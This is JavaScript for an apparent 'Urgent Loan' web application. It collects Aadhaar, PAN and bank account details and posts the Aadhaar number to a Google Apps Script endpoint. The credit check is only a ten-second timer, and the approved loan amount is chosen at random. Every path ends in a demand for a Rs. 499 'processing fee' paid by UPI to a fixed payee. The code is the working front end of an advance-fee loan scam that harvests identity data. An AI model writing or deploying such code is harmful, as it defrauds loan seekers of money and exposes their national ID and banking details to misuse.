let eligibleAmt = 0, selectedLoan = 10000;

    function nextStep1() {
      const Aadhaar = document.getElementById("Aadhaar").value.trim();
      const pan = document.getElementById("pan").value.trim().toUpperCase();
      let AadhaarError = "", panError = "";

      if (!/^\d{12}$/.test(Aadhaar)) {
        AadhaarError = "Aadhaar must be 12 digits.";
      }

      if (!/^[A-Z0-9]{10}$/.test(pan)) {
        panError = "PAN must be 10 alphanumeric characters.";
      }

      document.getElementById("AadhaarError").innerText = AadhaarError;
      document.getElementById("panError").innerText = panError;

document.getElementById("AadhaarError").classList.remove("fade-error");
document.getElementById("panError").classList.remove("fade-error");

setTimeout(() => {
  if (AadhaarError) document.getElementById("AadhaarError").classList.add("fade-error");
  if (panError) document.getElementById("panError").classList.add("fade-error");
}, 10);

      if (!AadhaarError && !panError) {
  const purpose = document.getElementById("loanPurpose").value;
  const otherText = document.getElementById("otherPurposeInput").value.trim();
  const errorEl = document.getElementById("otherPurposeError");

  errorEl.innerText = "";

  if (purpose === "Other Purpose" && !otherText) {
    errorEl.innerText = "Please specify your loan purpose.";
    return;
  }

  document.getElementById('step1').classList.remove('active');
  document.getElementById('step2').classList.add('active');
  startCIBIL();
}
    }

    function nextStep(n) {
  document.getElementById('step' + n).classList.remove('active');
  document.getElementById('step' + (n + 1)).classList.add('active');

  // STEP 3: Eligible Loan Amount
  if (n + 1 === 3) {
    const options = [50000, 60000, 80000, 100000, 200000, 500000, 1000000];
    eligibleAmt = options[Math.floor(Math.random() * options.length)];
    document.getElementById("eligibleAmount").innerText = eligibleAmt.toLocaleString();
    let slider = document.getElementById("loanSlider");
    slider.max = eligibleAmt;
    slider.value = eligibleAmt;
    updateLoan(eligibleAmt);
  }

  // STEP 4: EMI Calculation
  if (n + 1 === 4) {
    document.getElementById("loanFinal").innerText = selectedLoan.toLocaleString();
    calculateEMI();
  }

  // STEP 6: Fixed Rs. 499 payment + UPI button + QR
if (n + 1 === 6) {
  const charge = 499;
  document.getElementById("serviceCharge").innerText = charge.toLocaleString();

  const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(
    `upi://pay?pa=onecliq@ptyes&pn=Urgent%20Loan&am=${charge}&cu=INR`
  )}`;
  document.querySelector('#step6 img').src = qrUrl;

  // Remove previous button if exists
  const oldBtn = document.getElementById("upiDirectButton");
  if (oldBtn) oldBtn.remove();

  // Create direct UPI button
  const deeplink = `upi://pay?pa=onecliq@ptyes&pn=Urgent%20Loan&am=${charge}&cu=INR`;
  const btn = document.createElement("a");
  btn.href = deeplink;
  btn.id = "upiDirectButton";
  btn.innerHTML = `<button style="margin-top: 15px; padding: 12px 25px; background: #4caf50; color: white; font-size: 16px; border: none; border-radius: 6px;">Pay via UPI App</button>`;
  btn.style.textDecoration = "none";

  document.querySelector("#step6 .center").appendChild(btn);

  // Update message text
  document.querySelector("#step6 p").innerHTML = `<strong>Pay loan processing fee including 18% GST.</strong>`;
}

}

document.getElementById("loanPurpose").addEventListener("change", function () {
  const selectedValue = this.value;
  const otherBox = document.getElementById("otherPurposeContainer");
  if (selectedValue === "Other Purpose") {
    otherBox.style.display = "block";
  } else {
    otherBox.style.display = "none";
    document.getElementById("otherPurposeError").textContent = "";
  }
});

    function prevStep(n) {
      document.getElementById('step' + n).classList.remove('active');
      document.getElementById('step' + (n - 1)).classList.add('active');
    }

    function limitLength(input, max) {
      if (input.value.length > max) input.value = input.value.slice(0, max);
    }

    function startCIBIL() {
      let time = 10;
      let timer = setInterval(() => {
        document.getElementById("cibilTimer").innerText = time;
        time--;
        if (time < 0) {
          clearInterval(timer);
          nextStep(2);
        }
      }, 1000);
    }

    function updateLoan(val) {
      selectedLoan = parseInt(val);
      document.getElementById("loanDisplay").innerText = selectedLoan.toLocaleString();
    }

    function calculateEMI() {
      let t = parseInt(document.getElementById("emiTenure").value);
      let interest = selectedLoan * ((t * 2) / 100);
      let total = selectedLoan + interest;
      let emi = Math.round(total / t);

      document.getElementById("totalPayable").innerText = Math.round(total).toLocaleString();
      document.getElementById("emiAmount").innerText = emi.toLocaleString();
    }

    function validateBankDetails() {
      let valid = true;
      const bank = document.getElementById("bankAccount").value.trim();
      const ifsc = document.getElementById("ifscCode").value.trim();
      const holder = document.getElementById("accountHolder").value.trim();

      document.getElementById("bankAccountError").innerText = bank ? "" : "Required";
      document.getElementById("ifscError").innerText = ifsc ? "" : "Required";
      document.getElementById("accountHolderError").innerText = holder ? "" : "Required";

      if (!bank || !ifsc || !holder) valid = false;

      if (valid) nextStep(5);
    }
  // ... all your existing code above ...

  function showStatusCheck() {
    document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
    document.getElementById('statusCheck').classList.add('active');
  }

  function checkStatus() {
    const Aadhaar = document.getElementById("statusAadhaar").value.trim();
    if (!/^\d{12}$/.test(Aadhaar)) {
      document.getElementById("statusError").innerText = "Aadhaar must be 12 digits.";
    } else {
      document.getElementById("statusError").innerText = "";
      document.getElementById("statusCheck").classList.remove('active');
      document.getElementById("statusResult").classList.add('active');
    }
  }

  function hideStatusCheck() {
    document.getElementById("statusCheck").classList.remove('active');
    document.getElementById("step7").classList.add('active'); // go back to last step
  }

  function hideStatusResult() {
    document.getElementById("statusResult").classList.remove('active');
    document.getElementById("statusCheck").classList.add('active');
  }
function goHome() {
  document.querySelectorAll(".step").forEach(s => s.classList.remove("active"));
  document.getElementById("step1").classList.add("active");
  window.scrollTo({ top: 0, behavior: "smooth" });
}

async function saveAadhaar() {
  const Aadhaar = document.getElementById("Aadhaar").value.trim();

  if (!/^\d{12}$/.test(Aadhaar)) {
    document.getElementById("AadhaarError").innerText = "Aadhaar must be 12 digits.";
    return;
  }

  document.getElementById("AadhaarError").innerText = "";

  try {
    const response = await fetch('https://script.google.com/macros/s/AKfycbwNnfUQcM_yvdDhgeCkM-aCJeXpcTDoYJ-tHHEU02gp69DLfPZKdmaxkFoEBHzu0gGacg/exec', {
      method: 'POST',
      body: JSON.stringify({ aadhaar: Aadhaar }),
      headers: { 'Content-Type': 'application/json' },
    });

    const text = await response.text();

    if (text === "EXISTS") {
      document.getElementById("AadhaarError").innerText = "This Aadhaar already applied.";
    } else if (text === "OK") {
      nextStep1(); // go to next step
    } else {
      document.getElementById("AadhaarError").innerText = "Server Error. Try again.";
    }
  } catch (err) {
    console.error(err);
    document.getElementById("AadhaarError").innerText = "Network error. Try again.";
  }
}
